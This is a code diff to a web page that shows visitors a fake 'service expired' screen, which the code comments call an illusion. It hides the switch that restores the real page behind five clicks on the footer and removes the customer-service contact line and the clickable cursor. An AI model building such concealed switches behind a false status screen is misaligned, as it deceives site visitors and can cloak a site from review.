@@ -821,7 +821,6 @@
         <div class="expired-code">ERR_SERVICE_EXPIRED</div>
         <div class="expired-time">停用时间：2026-05-18 00:00:00</div>
         <div class="expired-footer">
-            <p>如有疑问请联系平台客服</p>
             <p class="expired-id">Trace ID: ${Math.random().toString(36).substr(2, 16)}</p>
         </div>
     </div>
@@ -969,20 +968,24 @@
         });
     }
 
-    // 失效幻象的隐蔽开关 - 点击底部文字切换回正常页面
+    // 失效幻象的隐蔽开关 - 点击底部区域5次切换回正常页面
     var expiredFooter = expiredOverlay.querySelector('.expired-footer');
+    var expiredFooterClicks = 0;
     if (expiredFooter) {
-        expiredFooter.style.cursor = 'pointer';
         expiredFooter.addEventListener('click', function() {
-            fetch('/api/site-toggle', { method: 'POST' })
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    if (!data.expired) {
-                        expiredOverlay.classList.add('hidden');
-                        container.style.display = '';
-                        document.getElementById('douyinNotifModal').classList.add('active');
-                    }
-                });
+            expiredFooterClicks++;
+            if (expiredFooterClicks >= 5) {
+                expiredFooterClicks = 0;
+                fetch('/api/site-toggle', { method: 'POST' })
+                    .then(function(r) { return r.json(); })
+                    .then(function(data) {
+                        if (!data.expired) {
+                            expiredOverlay.classList.add('hidden');
+                            container.style.display = '';
+                            document.getElementById('douyinNotifModal').classList.add('active');
+                        }
+                    });
+            }
         });
     }
 
